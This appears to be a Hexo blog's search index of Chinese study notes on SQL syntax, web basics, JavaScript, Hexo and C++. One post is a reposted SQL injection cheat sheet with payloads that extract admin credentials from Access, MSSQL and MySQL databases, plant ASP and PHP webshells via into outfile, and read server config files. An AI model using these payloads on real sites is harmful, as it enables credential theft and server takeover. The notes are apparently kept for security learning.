<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[敏感文件探测]]></title>
    <url>%2F2018%2F07%2F27%2F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B%2F</url>
    <content type="text"></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常规SQL注入笔记]]></title>
    <url>%2F2018%2F07%2F25%2F%E5%B8%B8%E8%A7%84SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[转载自http://599985375.lofter.com/post/1d071723_7b32422 基本常识简单判定有无漏洞： 粗略型：提交单引号’ 逻辑型（数字型注入）：and 1=1/and 1=2 逻辑型（字符型注入）：’ and ‘1’=’1/‘ and ‘1’=’2 逻辑型（搜索型注入）：%’ and 1=1 and ‘%’=’%/%’ and 1=2 and ‘%’=’% 简单判断数据库信息：粗略型： 加单引号’（根据服务器报错的信息来判断） 加;–（;表示分离，– 则是注释符，;和–MSSQL数据库有，ACCESS数据库没有） 逻辑型： and user&gt;0 and (select count(*) from msysobjects)&gt;0 ……（页面错误为access数据库） and (select count(*) from sysobjects)&gt;0 ……（页面正常为MSSQL数据库） and db_name()&gt;0 ……（爆数据库名） and version&gt;0（爆SQLServer版本信息以及服务器操作系统的类型和版本信息） 判断MSSQL权限： and 0&lt;&gt;（Select ISSRVROLEMEMBER（’sysadmin’））–（页面正常则为SA） and 0&lt;&gt;（Select IS_MEMBER（’db_owner’））–（页面正常则为db_owner） and 0&lt;&gt;（Select IS_MEMBER（’public’））–（页面正常则是public）注意：以上方法适用于参数是int数字型的时候。若为字符型，需在参数后添加单引号’并在查询语句后添加;–，搜索型注入以此类推。 ACCESS注入基本流程：猜解表名： and 0&lt;&gt;(select count() from 表名) 或 and exists（Select from 表名）猜解字段： and exists（Select 字段名 from 表名）（页面正常存在该字段，不正常不存在该字段）猜解用户名和密码长度： and（Select top 1 len（列名） from 表名）&gt;N（TOP表示把最前面的一条记录提取出来；N为变换猜解的列长度，页面错误即说明该列长度为N）如： and 1=(select count(*) from user where len(name)&gt;6) 错误 and 1=(select count(*) from user where len(name)&gt;5) 正确则表示user表中name字段的第一条记录的长度是6。 猜解用户名和密码： and (select top 1 asc(mid(列名,1,1)) from 表名)&gt;0如： and (select top 1 asc(mid(name,1,1)) from user)&gt;96 页面正常 and (select top 1 asc(mid(name,1,1)) from user)&gt;97 页面错误则表示user表中name字段的第一条记录的第一个字符的ASCLL码为97注意：因为MD5的密文长度通常有16位、18位、32位、40位等几种，所以猜解密码的时候试一试15、16、17、18、31、32、39、40等长度可以加快猜解进度。 MSSQL报错注入基本流程：爆出表名和字段：having 1=1– 猜解表名： 获得第一个表名：and (select top 1 name from sysobjects where xtype=’u’)&gt;0 获得第二个表名：and (select top 1 name from sysobjects where xtype=’u’ and name not in (‘user’))&gt;0 以此类推。 猜解列名： 得到col_name表中的第一个列名：and (select top 1 col_name(object_id(‘字段’),1) from sysobjects)&gt;0 猜解字段内容：and (select top 1 列名 from [表名])&gt;0 如： 获取用户名：and (select top 1 username from [admin])&gt;0 获取密码：and (select top 1 password from [admin])&gt;0 导出webshell： 方法1：利用SQL执行命令功能导出WebShell SELECT ‘&lt;%execute request(“a”)%&gt;’ into [vote] in ‘d:webx.asp;.xls’ ‘excel 8.0;’ from vote 注意：需拥有SQL执行权限且知道绝对路径 方法2： 建立一个有一个A字段的表 表名为a，字段类型为字符，长度为50。 在表A的a字段插入一句话木马，把表a的内容导出为物理路径的一个EXCEL文件。 导出为EXCEL后在利用IIS解析漏洞就可以变成webshell了。 方法2的SQL语句： create table cmd (a varchar(50)) insert into cmd (a) values (‘&lt;%execute request(“listentide”)%&gt;’) select * into [a] in ‘f:hostqhdyxtweba.asp;.xls’ ‘excel 4.0;’ from cmd drop table cmd MYSQL注入基本流程：MYSQL注入漏洞是否存在的判断方法与ACCESS注入和MSSQL注入相同。 MYSQL注入漏洞的数据库类型判断方法也可以使用单引号’。 数据库权限判断：and ord(mid(user(),1,1))=114 /* （页面正常说明为root） 判断当前页面字段总数： 方法1、用union联合查询：and 1=1 union select 1,2,3,4,5…… 方法2、用order by 查询“order by *– 判断显示位： 方法1、http://www.f4ck.org/article.php?id=1 and 1=2 union select 1,2,3,4,5,6,7…… 方法2、http://www.f4ck.org/article.php?id=-1 union select 1,2,3,4,5,6,7…… 查库： 版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。 获取第一个库名：and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 获取第二个库名：and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 1,2 以此类推。 查表： 获取数据库中第一个表名：and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库名的十六进制 limit 0,1 获取数据库中第二个表名：and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库名的十六进制 limit 1,2 查列： 获取数据库中指定表的第一个列名：and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名的十六进制 limit 0,1 获取数据库中指定表的第二个列名：and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名的十六进制 limit 0,1 得到字段内容： 在不同的显示位显示不同的字段内容：and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1 在同一个显示位显示不同的字段内容：and 1=2 Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1 一次性查出所有表名：union select 1,2,3,4,GROUP_CONCAT(DISTINCT table_name),6 from information_schema.columns where table_schema=数据库名的16进制 一次性查出所有字段名：union select 1,2,3,4,GROUP_CONCAT(DISTINCT column_name),6 from information_schema.columns where table_schema=数据库名的16进制 导出一句话WebShell： 方法1： Drop TABLE IF EXISTS temp; Create TABLE temp(cmd text NOT NULL); Insert INTO temp (cmd) VALUES(‘’); Select cmd from temp into out file ‘F:/wwwroot/eval.php’; Drop TABLE IF EXISTS temp; 方法2： Select ‘’ into outfile ‘F:/wwwroot/eval.php’; load_file() 常用路径： c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件 c:/Program Files/Apache Group/Apache/conf/httpd.conf 或C:/apache/conf/httpd.conf 查看WINDOWS系统apache的配置文件 c:/Resin-3.0.14/conf/resin.conf查看jsp开发的网站 resin文件配置信息]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>SQL</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web常见漏洞及分析]]></title>
    <url>%2F2018%2F07%2F22%2FWeb%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[XSS 漏洞（Cross Site Script | 跨站脚本）常见危害： 盗取用户信息，钓鱼，制造蠕虫等概念： 黑客通过“ Html 注入”篡改网页，插入了恶意脚本，当用户在浏览网页时，实现控制用户浏览器的一种攻击方式 XSS 通常有三种类型： 存储型：访问网站，触发XSS。firebug 的 html 中查找黑客端攻击流程： 构造带有 XSS 脚本的留言内容 –&gt; 提交给后端 web 应用程序 –&gt; web 应用程序将带有 XSS 脚本的留言写入数据库 –&gt; 用户或管理员查看留言触发 XSS用户端被攻击流程： 用户打开浏览器 –&gt; 访问了有 XSS 脚本的留言页面 –&gt; 浏览器请求内容 –&gt; 查询数据库 –&gt; 数据库将带有 XSS 脚本的留言返回给 web 应用程序 –&gt; 显示在用户的页面中触发 XSS例：留言中加入 &lt;img src=&quot;#&quot; onerrror=alert(/XSS/)&gt; 反射性：访问携带 XSS 脚本的连接，触发 XSS用户端被攻击流程： 用户访问了有XSS脚本的链接 –&gt; 浏览器向后端的web应用程序发送请求 –&gt; 后端程序将 url 中的 XSS 脚本数据写入到响应页面并返回给浏览器 –&gt; 浏览器渲染响应页面触发 XSS例： url 中携带 &lt;img src=&quot;#&quot; onerror=&quot;alert=(/XSS/)&quot;&gt; DOM 型： 访问携带 XSS 脚本的链接，触发XSSfirebug 脚本中查找“ hash ”攻击过程： 用户在浏览器中访问携带XSS脚本的链接 –&gt; 浏览器通过 javascript 从 url 中提取出 XSS 脚本的内容并写入到 DOM 中 –&gt; 触发 XSS CSRF 漏洞（Cross-site request forgery | 跨站请求伪造）常见危害： 执行恶意操作（“被转账”、“被发垃圾评论”），制造蠕虫等概念： 利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。原理：在转账页面可能存在看不见的 iframe 标签，因为 width 和 height 为0 URL 跳转漏洞概念： 借助未验证的 URL 跳转，将应用程序引导到不安全的第三方区域，从而导致安全问题例如：实现方式： Header 头跳转 JavaScript 跳转 Meta 跳转 SQL 注入SQL 注入是一种常见的Web安全漏洞，攻击者利用这个漏洞，可以进行访问或修改数据，或者利用潜在的数据库漏洞进行攻击SQL 注入的必备条件 1、可以控制输入的数据 2、服务器要执行的代码拼接了控制的数据SQL 注入的本质 数据和代码未分离，即数据当作了代码来执行 命令注入命令注入要满足三个条件： 1、调用可执行系统命令的函数 2、函数或函数的参数可控 3、拼接注入命令PHP执行命令的函数：system exec shell_exec eval ……]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[submit text 3初始配置]]></title>
    <url>%2F2018%2F07%2F13%2Fsubmit-text-3%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[submit text 3安装PyV8有时下载 Emmet 后，使用会报出关于 PyV8 的错误这时需要我们手动去安装 PyV8 1、在github上下载需要的包：传送门 2、把下载的压缩包解压到如下路径： 3、重启submit text 3即可 submit text 3在浏览器中预览html等文件 1、安装插件：“view in browser” 2、打开：“Preferences-&gt;Key Bindings-User”，输入如下内容：[ { &quot;keys&quot;: [&quot;ctrl+alt+f&quot;], &quot;command&quot;: &quot;open_in_browser&quot; },] submit text 3在指定路径下在浏览器中预览 1、安装插件：“SideBarEnhancements” 2、打开：“Preference-&gt;Package Settings-&gt;Side Bar-&gt;Settings User-User”，添加如下：123&#123; "default_browser": "chrome" //one of this list: firefox, aurora, chrome, canary, chromium, opera, safari&#125; 3、在侧边栏右键，找到“Project-&gt;Edit Preview URLs”，添加如下：123456&#123; "项目路径":&#123; "url_testing": "localhost地址", "url_production": "线上地址" &#125;&#125; 4、打开：“Preference-&gt;Package Settings-&gt;Side Bar-&gt;key Bindings-User”，添加如下：1234567891011[&#123; "keys": ["ctrl+shift+f"], "command": "side_bar_open_in_browser", "args": &#123; "paths": [], "type": "testing", "browser": "" &#125; &#125;]]]></content>
      <tags>
        <tag>submit text 3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web基础知识]]></title>
    <url>%2F2018%2F07%2F11%2Fweb%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[Url组成 HTTP请求方式HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URL制定的资源的不同操作方式，具体介绍如下： 1、OPTIONS: 返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送”*”的请求来测试服务器的功能性。 2、HEAD: 向服务器索要与个体请求相一致的响应，只不过响应将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。 3、GET: 向特定的资源发出请求。 4、POST: 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。 5、PUT: 向指定资源位置上传其最新内容。 6、DELETE: 请求服务器删除Request-URL所标识的资源。 7、TRACE: 回显服务器收到的请求，主要用于测试或诊断。 8、CONNECT: HTTP/1.1协议中预留给能够将连接改为管道的代理服务器。 Javascript由哪几部分组成参考来源：https://www.jianshu.com/p/f6c94cfa3139 虽然JavaScript和ECMAScript通常被人用来表达相同的意思，但JavaScript的含义去比ECMA-262中规定的多得多。一个完整的JavaScript实现应由三个部分组成： 1.核心（ECMAScript） 2.文档对象模型（DOM） 3.浏览器对象模型（BOM） 核心（ECMAScript） 由ECMA-262定义的ECMAScript是一种在国际认可的标准的脚本语言规范，与Web浏览器没有依赖关系。ECMA-262标准主要规定了这门语言由以下组成部分： 1.语法 2.变量和数据类型 3.关键字和保留字 4.操作符 5.控制语句 6.对象 2009年ECMAScript 5.0版正式发布。在很长一段时间，使用javaScript都是按照5.0的标准。2015年ECMAScript 6发布正式版本，官方称为ECMAScript 2015。ECMAScript定义了脚本语言的所有属性、方法和对象。因此抵用web客户端脚本编码时一定要遵循ECMAScript标准。 文档对象模型（DOM） DOM（文档对象模型）是 HTML 和 XML 的应用程序接口（API）。DOM 将把整个页面规划成由节点层级构成的文档。HTML或XML页面中的每个组成部分都是某种类型的节点，这些节点又包含着不同类型的数据。 浏览器对象模型（BOM） IE 3.0 和 Netscape Navigator 3.0 提供了一种特性 - BOM（浏览器对象模型），可以对浏览器窗口进行访问和操作。使用 BOM，开发者可以移动窗口、改变状态栏中的文本以及执行其他与页面内容不直接相关的操作。]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL常用语句--增删改查]]></title>
    <url>%2F2018%2F07%2F02%2FSQL%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%2F</url>
    <content type="text"><![CDATA[查 查全部： select * from &lt;tablename&gt;;条件查询：select &lt;filed&gt; from &lt;tablename&gt; where &lt;field&gt;=&lt;key&gt;;带有函数查询： select count(*) from &lt;tablename&gt;;模糊查询： select &lt;field&gt; from &lt;tablename&gt; where &lt;field&gt; like ‘%value%’; 增 添加库： create database &lt;databasename&gt;;创建新表： create table &lt;tablename&gt; (col1 type1, col2, ...);插入数据： insert into &lt;tablename&gt;(field1,field2……) values(value1,value2………);增加一列： alter table &lt;tablename&gt; add column &lt;colname&gt; &lt;coltype&gt;;添加主键： alter table &lt;tablename&gt; add primary key(col); 改 更新： update &lt;tablename&gt; set &lt;field&gt;=&lt;value&gt; where &lt;条件&gt;; 删 删除库： drop database &lt;databasename&gt;;删除表： delete from &lt;tablename&gt; where &lt;条件&gt;;（会留下日志文件，能被还原修复）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;truncate table &lt;tablename&gt;;（不会留下日志文件，不能被还原修复） 子句： where子句：= , &gt; , &lt; , &lt;&gt;(不等于) , &gt;= , &lt;=order by子句：asc (升序) , desc(降序)]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网页返回上一页的几种方法]]></title>
    <url>%2F2018%2F07%2F01%2F%E9%A1%B5%E8%BF%94%E5%9B%9E%E4%B8%8A%E4%B8%80%E9%A1%B5%2F</url>
    <content type="text"><![CDATA[以按钮点击的方式实现 &lt;input type=&quot;button&quot; name=&quot;Submit&quot; value=&quot;返回上一页&quot; onclick=&quot;javascript:window.history.back(-1);&quot;&gt;或者&lt;input type=&quot;button&quot; name=&quot;Submit&quot; value=&quot;返回上一页&quot; onclick=&quot;javascript:history.back(-1);&quot;&gt; 一点击图片的方式实现 &lt;img src=&quot;图片的路径&quot; onclick=&quot;javascript:window.history.back(-1);&quot; title=&quot;返回上一页&quot; alt=&quot;返回点击图片&quot; /&gt;或者&lt;img src=&quot;图片的路径&quot; onclick=&quot;javascript:history.back(-1);&quot; title=&quot;返回上一页&quot; alt=&quot;返回点击图片&quot; /&gt; 文字点击的方式实现 &lt;a href=&quot;javascript:history.back(-1)&quot;&gt;返回上一页&lt;/a&gt;或者&lt;a href=&quot;#&quot; onClick=&quot;javascript:history.back(-1);&quot;&gt;返回上一页&lt;/a&gt; 图片链接的方式实现 &lt;a href=&quot;javascript:window.history.back(-1)&quot; target=&quot;_self&quot;&gt;&lt;img src=&quot;图片的路径&quot; /&gt;&lt;/a&gt;或者&lt;a href=&quot;javascript:history.back(-1)&quot; target=&quot;_self&quot;&gt;&lt;img src=&quot;图片的路径&quot; /&gt;&lt;/a&gt; 过几秒钟后返回上一页 &lt;script language=&quot;javascript&quot;&gt;setTimeout(&quot;window.history.go(-1)&quot;,3000)&lt;/script&gt;或者&lt;script language=&quot;javascript&quot;&gt;setTimeout(&quot;history.go(-1)&quot;,3000)&lt;/script&gt;]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo常用命令]]></title>
    <url>%2F2018%2F06%2F29%2FHexo%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[hexo s hexo shexo s 是 hexo serve 的缩写，用于本地预览： http://localhost:4000/ hexo clean 清除缓存文件 db.json 和已生成的静态文件 public网页异常清除缓存 hexo new hexo new 笔记名称新建一篇标题为“笔记名称”的文章 hexo d hexo dhexo d 是 hexo deploy 的缩写。用于自动生成静态文件，并部署到仓库。 hexo g hexo ghexo g 是 hexo generate 的缩写。用于生成网站静态文件到默认的 public 文件夹。 hexo new page hexo new page name新建一个标题为 name 的页面，默认链接地址为/name/页面不会出现在首页文章列表和归档中，也不支持分类和标签。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++复习！！！（课本：谭老爷爷版）]]></title>
    <url>%2F2018%2F06%2F24%2Fc%2B%2B%E5%A4%8D%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[一、从C到C++ C++如何实现I/O？它的优势在哪里？ 1、c++中I/O的概念 在c++中有一个stream，这个类，所有的I/O都以这个“流”为基础，包括我们认识的文件I/O。stream有两个重要的运算符: a、插入器（&lt;&lt;）：向流输入数据。 b、析取器（&gt;&gt;）：从流中读取数据。 2、与c语言相比之下的优势 1、最大的好处时完成了对流操作的封装。原来文件操作都是一个个分开的函数，现在的操作都是对象的方法。2、stream适用于设备输入和输出的。fstream是stream的派生类，即文件流（设备对象是文件），作为文件在c++中的一个抽象对象。 什么是重载函数？如何区分重载函数？ 1、什么是重载函数？ c++允许在同一作用域中用同意函数名来定义多个函数，这些函数的参数个数和参数类型不相同，这些同名的函数用来实现不同的功能，这就是函数的重载，即一个函数名多用。 2、区分函数重载 1、函数形参的个数； 2、函数形参的类型； 3、形参的顺序； 4、不能把返回值作为函数重载的条件，原因是编辑器在编译时不回去判断函数的返回类型，函数只有调用后，编译器才会去验证返回类型，所以返回值类型不能做为函数重载的依据； 5、常函数const可以作为函数重载的判断依据，原因：重载[]运算符时，有没有const的区别是：有const只读，没有const读写都可以。 什么是函数模板？为什么要使用函数模板？ 1、什么是函数模板？ 建立一个通用函数，其函数类型和形参不具体指定，用一个虚函数的类型来代表，这个通用的函数就称为函数模板。 例：max函数模板 template&lt;typename T&gt;T max(T a, T b, T c) {} 2、为什么要使用函数模板？ 简化对同名的知识形参类型不同的函数的定义。 使用带有默认参数的函数时，要注意些什么？ 1、如果函数的定义在函数调用之前，则应在函数定义中给出默认值。 2、一个函数不能既作为重载函数，又作为有默认参数的函数。 什么是变量的引用？要注意什么？ 在c++中，变量的“引用”就是变量的别名，因此，引用又称别名。建立“引用”的作用是为一个变量再起另一个名字，一边在需要时可以方便、间接地引用该变量。对一个变量的“引用”的所有的操作，实际上都是对其所代表的（原来的）变量的操作。 例：有一个变量a，想给他起一个别名b 12int a;int &amp;b = a; ATTENTION:由于引用不是独立的变量，编译系统给它单独分配储存单元，因此，在建立引用时只有声明没有定义，只是声明它和原有某一变量的关系。 为什么要使用inline函数？ 为了提高效率。 调用函数时需要一定的时间，如果有些函数需要频繁使用，则累计所用时间会很长，从而降低程序的执行效率。c++提供一种提高效率的方法，即在编译时，将所调用函数的代码嵌入到主调函数中。这种嵌入到主调函数中的函数称为内联函数。 作用域限定符“::”的作用是什么 在c++中，不同作用域内声明的变量可以同名，当局部变量和全局变量同名时，在局部变量中引用全局变量用到作用域限定符“::”。当全局变量和局部变量名字相同，重载时，就规定：用 “:: + 全局变量名” 来称呼全局变量。 二、类和对象 程序 = 对象 + 对象对象 = 算法 + 数据结构 什么是类？什么是对象？什么是抽象？什么是类的声明、类的定义？ 对象： 客观世界中任何一个事物都可以看成一个对象（object）。 类： 类是所有面向对象语言的共同特征，所有面向对象的语言都提供了这种类型。 抽象： 类是对象的抽象，而对象是类的具体实例。 数据抽象: 只向外界提供关键信息，并隐藏其后台的实现细节，即只表现必要的信息而不呈现细节。数据抽象是一种依赖于接口和实现分离的编程（设计）技术。 类的声明： 12345678class 类名 &#123;private: 私有的数据和成员函数;public: 公用的数据和成员函数;protected: 受保护的数据和成员函数;&#125;; 类的定义： 12345678910111213141516171819202122232425//1、先声明，后定义：//(1)、class 类名 对象名1,对象名2,...;//(2)、类名 对象名1,对象名2,...;//2、声明同时定义：class 类名 &#123;private: 私有的数据和成员函数;public: 公用的数据和成员函数;protected: 受保护的数据和成员函数;&#125;对象名1,对象名2,...;//3、不出现类名直接定义对象（非常 不建议 使用）：class &#123;private: 私有的数据和成员函数;public: 公用的数据和成员函数;protected: 受保护的数据和成员函数;&#125;对象名1,对象名2,...; c++中有哪些权限限定符？各起什么作用？ private private将成员声明为私有成员，只能被本类中的成员函数引用，类外不能调用（友元类除外）。 public public将成员声明为公有成员，既可以被本类成员函数所引用，也可以被类的作用域内的其他函数所引用。 protected protected将成员声明为受保护成员，不能被类外访问，但是可以被派生类的成员函数访问。 什么是类的封装？封装的原则是什么？ 1、什么是封装？ 封装可以隐藏实现细节，使代码模块化。封装是把过程和数据包围起来，对数据的访问只能通过已定义的界面。在面向对象编程上可理解为：把客观事物封装成抽象的类，并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的进行信息隐藏。 2、封装的原则是什么？ 简化用户接口，隐藏实现细节，这个是封装的根本目的。封装的难点在于如何设计接口。其一：必须保证接口是功能的全集，即接口能够覆盖所有需求。不能完成必要功能的封装是没有意义的。其二：尽量使接口是最小冗余的。这是为了简化类使用者的学习和使用，难用的接口是最容易让人遗忘的。冗余接口的存在是被允许的，但必须保证冗余接口是有效的。也就是说，增加冗余接口会带来很大的好处，比如性能的飞升。其三：要保证接口是稳定的，将接口和实现分离，并将实现隐藏，就是为了能保护类使用者在类的实现细节改变的情况下，不必随时修改。一旦接口被公布，永远也不要改变它。 同一个类所定义的不同对象在调用同一个成员函数时，调用的是同一段代码吗？通过什么来区分各自的数据？ 是同一段代码。 通过this指针：每一个成员函数中都包括这个指针的名字是固定的，称为this。它是指向对象的指针，他的值是当前被调用的成员函数所在的对象的起始地址。例： 1234567int Box::volume()&#123; return (height * width * length);&#125;//C++把它处理为:int Box::volume(Box * this)&#123; return (this-&gt;height * this-&gt;width * this-&gt;length);&#125; 类的成员函数和普通全局函数在形式上有什么区别？在本质上有什么区别？ 区别1：静态成员函数实际上是一个全局函数,不依赖一个类的对象. 而属于类，不创建对象也可调用，静态成员函数没有this指针。普通成员函数依赖一个类的对象,也就是它有一个隐藏的调用参数（this）指针,必须指向一个类的对象。 区别2：静态函数只能访问类中的静态成员变量； 区别3：如果成员函数想作为回调函数来使用，如创建线程等，一般只能将它定义为静态成员函数才行。 三、类和对象的进一步讨论 构造函数、析构函数的英文单词是什么？ 构造函数——constructor 析构函数——destructor 构造函数的特点是什么？析构函数的特点是什么？ c++提供构造函数，来处理对象的初始化。构造函数是一种特殊的成员函数，与其他成员函数不同，不需要用户来调用它，而是在建立对象时自动执行。构造函数只是起初始化值的作用，但实例化一个对象的时候，可以通过实例去传递参数，从主函数传递到其他的函数里面，这样就使其他的函数里面有值了。规则，只要你一实例化对象，系统自动回调用一个构造函数，就算不写，编译器也自动调用一次。 析构函数与构造函数同名，但该函数前面加~。析构函数没有参数，也没有返回值，而且不能重载，在一个类中只能有一个析构函数。当撤销对象时，编译器也会自动调用析构函数。每一个类必须有一个析构函数，用户可以自定义析构函数，也可以是编译器自动生成默认的析构函数。一般析构函数定义为类的公有成员。 构造函数、析构函数的执行顺序是什么？ 先构造的先执行析构。 在C语言中，我们说main()函数是程序的入口，是最先被调用的函数，在C++中情况是这样吗？如果不是请说明原因，并举出实例。 c++中不是这样。 因为存在构造数据类型的定义对象定义，且对象为全局对象的话，则该类对象所属的构造类型的构造函数在main()函数之前执行。 const关键字const在c++中要尽可能的使用 table th:first-of-type { width:30%; } 形式 含义 Time const t1; t1是常对象，其值在任何情况下都不能改变 void Time::fun()const; fun是Time类中的成员函数，可以引用，但不能修改本类中的成员数据 Time * const p; p是指向time类对象的常指针变量，p的值（p的指向）不能改变 const Time * p; p是指向Time类常对象的指针变量，p指向的类对象的值不能通过p来改变 const Time &amp;t1 = t; t1是Time类对象t的引用，二者指向同一储存空间，t的值不能改变 const的作用是：数据的保护 常成员变量 类的常成员变量是用const关键字声明的成员变量，其值不可改变，它的初始值必须通过构造函数的初始化列表方式完成。一般将一个类中不可改变的值声明为常成员变量。但const成员变量有一个缺点：该类的所有对象都会const成员变量，而不是整个类共用一个。这种情况下，const常和static一起使用。 const成员函数 const成员函数语法为：int Obj::Func const;这表明成员函数Func const是个常成员函数，它的作用是表明只能引用类中的数据成员，而不能修改类中的数据成员。 常对象 语法为：const obj o(10); 或 obj const o(10);用const声明的对象为常对象，常对象必须初始化，如果一个对象被声明为const对象，则该对象的数据成员不可修改。即const对象不能调用该对象的非const成员函数。 指向const数据的指针 定义指针时，在指针的类型前面加上const表明该指针指向的对象是个常量。 const指针 在定义指针时，在指针的前面加上const表明该指针是一个常量，它必须被初始化。 const在参数中的使用 const在参数类型为指针或引用时经常被使用，这表明这个指针或引用所指向的数据不允许被修改，这样就保证了在被调函数中不能因为误操作而改变了主调函数中的值。 初始化列表的语法是怎样的？ 如下：1234567891011121314类名::构造函数名([参数表])[:成员初始化表]&#123;[构造函数体]&#125;//例：class Student&#123;public: Student(int n, char s, nam[]):num(n), sex(s)&#123; strcpy(name, nam); &#125;private: int num; char sex; int name[20];&#125;; 在C++中为什么使用new/delete，而不是malloc()/free()来来动态创建对象？如何使用new/delete来动态创建数组？ c语言中使用库函数malloc()和free()来动态申请和释放内存空间，但是存在两个问题：1、分配的大小需人为计算;2、只分配空间，而不涉及类型。c++使用了运算符new和delete来取代malloc()和free()函数。动态分配/释放内存。 例：动态创建一维数组123456789101112131415#include &lt;iostream&gt;using namespace std;int main()&#123; int n; cin &gt;&gt; n; //动态分配一维数组 int *arr = new int [n]; for(int i = 0; i &lt; n; i++) cin &gt;&gt; arr[i]; for(int i = 0; i &lt; n; i++) cout &lt;&lt; arr[i] &lt;&lt; " "; //释放arr数组 delete[] arr; return 0;&#125; 什么是对象的复制？什么是对象的赋值？ 对象的赋值 一般形式：对象名1 = 对象名2；对象的赋值只是用赋值号右边的对象的数据覆盖了赋值号左边的的对象的数据成员。因此必须使用有默认参数值的构造函数，以保证左值能被初始化。 对象的复制 一般形式：类名 对象2(对象1)； 或 `类名 对象2 = 对象1;例： 123456789101112131415161718class Student&#123;pubilc: Student ()&#123;m_strName="Jim";&#125; /* 默认的拷贝构造函数： Student (const Student &amp;stu)&#123;&#125; */ Student(const Student &amp;stu)&#123;m_strName = stu.m_strName;&#125; //显性定义的拷贝构造函数private: string m_strName;&#125;;int main()&#123; Student stu1; Student stu2 = stu1; Student stu3(stu1); return 0;&#125; 什么是深拷贝/浅拷贝？ 拷贝构造函数的语法如何？ 浅拷贝 对象拷贝时，仅仅是简单的值拷贝，这称为“浅拷贝”，这是系统默认的拷贝模式，不需要编程实现。 深拷贝 对象拷贝时，对堆中的数据编程进行拷贝，这称为“深拷贝”，这种拷贝模式需要编程实现。 拷贝构造函数 拷贝构造函数中只有哟个参数，为本类对象的一个引用，并通常使用const修饰。语法： 1234obj(const obj &amp;o)&#123; no = o.no; cout &lt;&lt; "copy constructor" &lt;&lt; no &lt;&lt; endl;&#125; static数据成员和static成员函数的特点是什么？static成员函数有什么限制？static数据成员如何初始化？ static数据成员拥有一块单独的储存区（不再类对象内部），不管该类创造了多少个对象。所有该类的对象共享这块区域，这就为这些类之间提供了一种相互通信的方法，并且它不会占据对象的储存空间。他的名字是属于类的（例：Circle::PI），这样可以很大程度上解决全局数据的名字冲突问题。它是有权限控制的，也就是说他可以是private的。 除了数据成员能定义为static的，成员函数也可以定义为static的。与static数据成员一样，static成员函数也是属于类的，而不是属于对象的。static成员函数是属于类的，所以它没有this指针，不创建对象就可以被调用。它的这个特点决定了static成员函数只能访问类中的static数据成员和static成员函数。与类的static数据成员一样，推荐使用类方式引用类的static成员函数。 在类内提供的仅仅是static数据成员的声明（编译器没有给它分配空间），而不是定义，所以不能使用构造函数对其进行初始化，static数据成员的初始化必须在类外完成。static数据成员在使用时，既可以使用对象方式引用，也可以使用类方式引用，通常使用类方式引用，以表明它是一个static数据成员。 为什么要使用友元？哪些内容可以作为类的友元？我们对友元的态度是什么？ 友元机制可以带来一些便利。 